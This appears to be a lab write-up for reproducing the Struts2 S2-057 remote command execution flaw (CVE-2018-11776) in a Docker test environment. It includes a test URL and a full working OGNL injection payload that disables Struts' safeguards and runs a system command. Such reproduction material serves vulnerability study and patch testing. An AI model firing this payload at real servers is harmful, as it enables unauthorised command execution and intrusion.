# Struts2 S2-057 Remote Command Execution Vulnerability (CVE-2018-11776)

When the configuration of Struts2 meets the following conditions:

 - alwaysSelectFullNamespace is true
 - The action element does not have the namespace attribute set, or a wildcard is used

The namespace will be passed by the user from the uri and computed as an OGNL expression, eventually causing any command execution vulnerabilities.

Impact version: Less than or equal to Struts 2.3.34 and Struts 2.5.16

Vulnerability details:

 - https://cwiki.apache.org/confluence/display/WW/S2-057
 - https://lgtm.com/blog/apache_struts_CVE-2018-11776
 - https://xz.aliyun.com/t/2618
 - https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg

## vulnerability environment

Start the Struts 2.3.34 environment that meets the criteria:

```
Docker-compose up -d
```

After the environment is started, visit `http://your-ip:8080/showcase/` and you will see the Struts2 test page.

## Vulnerability recurrence

Test the OGNL expression `${233*233}`:

```
Http://your-ip:8080/struts2-showcase/$%7B233*233%7D/actionChain1.action
```

![](1.png)

It can be seen that the result of 233*233 has been returned in the Location header.

Use the OGNL expression given in any command given in [S2-057 Principle Analysis and Recurrence Process (POC)] (https://mp.weixin.qq.com/s/iBLrrXHvs7agPywVW7TZrg):

```
${
(#dm=@ognl.OgnlContext@DEFAULT_MEMBER_ACCESS).(#ct=#request['struts.valueStack'].context).(#cr=#ct['com.opensymphony.xwork2.ActionContext.container']). (#ou=#cr.getInstance(@com.opensymphony.xwork2.ognl.OgnlUtil@class)).(#ou.getExcludedPackageNames().clear()).(#ou.getExcludedClasses().clear()). (#ct.setMemberAccess(#dm)).(#a=@java.lang.Runtime@getRuntime().exec('id')).(@org.apache.commons.io.IOUtils@toString(#a .getInputStream()))}
```

It can be seen that the id command has been successfully executed:

![](2.png)